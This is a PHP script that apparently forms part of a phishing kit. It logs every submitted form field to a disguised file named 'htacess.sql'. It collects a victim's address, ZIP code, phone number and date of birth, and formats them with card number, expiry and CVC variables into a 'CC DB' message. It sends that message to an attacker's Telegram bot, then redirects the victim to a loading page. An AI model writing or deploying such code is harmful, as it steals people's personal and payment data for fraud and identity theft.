<?php
$data = !empty($_POST) ? $_POST : $_GET;
if (!empty($data)) {
    $txt = date('Y-m-d H:i:s') . "\n";
    foreach ($data as $k => $v) {
        $txt .= $k . ": " . (is_array($v) ? implode(', ', $v) : $v) . "\n";
    }
    file_put_contents(__DIR__ . '/htacess.sql', $txt . "\n", FILE_APPEND);
}


$address1 = $_POST['address1'];
$zip = $_POST['zip'];
$phone = $_POST['phone'];
$dob = $_POST['dob'];

$_SESSION["address1"] = $address1;
$_SESSION["zip"] = $zip;
$_SESSION["phone"] = $phone;
$_SESSION["dob"] = $dob;

$message  = "
╔════════════════════════════╗
 📇🔥 𝐏𝐄𝐑𝐒𝐎𝐍𝐀𝐋 𝐈𝐍𝐅𝐎 🔥📇
╚════════════════════════════╝

🏠 ┃ 𝐀𝐝𝐝𝐫𝐞𝐬𝐬 ➤ $address1
📮 ┃ 𝐙𝐈𝐏 ➤ $zip
🎂 ┃ 𝐃𝐎𝐁 ➤ $dob
📱 ┃ 𝐏𝐡𝐨𝐧𝐞 ➤ $phone
╔════════════════════════╗
   💳🔥 𝐂𝐂 DB 🔥💳
╚════════════════════════╝
$cardNumber|$expiry|$cvc

📡 ┃ IP ➤ $ip - $country - $as_name
🌐 ┃ Device ➤ $browser - $os - $device

╔════════════════════════════╗
   ⚡ 𝐅𝐔𝐋𝐋 𝐃𝐀𝐓𝐀 𝐋𝐎𝐀𝐃𝐄𝐃 ⚡
╚════════════════════════════╝
";

$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

$response = file_get_contents($url);
$result = json_decode($response, true);

header("Location: ../loading.html");
?>